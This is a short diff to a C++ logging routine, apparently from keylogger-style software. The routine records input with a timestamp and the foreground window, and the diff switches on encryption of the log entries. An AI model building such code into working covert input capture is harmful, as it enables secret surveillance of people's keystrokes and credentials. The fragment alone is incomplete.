@@ -36,11 +36,11 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
   if (processInfo && !blockProcessInfo) {
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
-	//Crypt::Encrypt(timeString);
+	Crypt::Encrypt(timeString);
 	logFile->Ofstream << timeString;
   }
   std::string cryptInput = input;
-  //Crypt::Encrypt(cryptInput);
+  Crypt::Encrypt(cryptInput);
   logFile->Ofstream << cryptInput;
   logFile->Ofstream.close();
   return true;
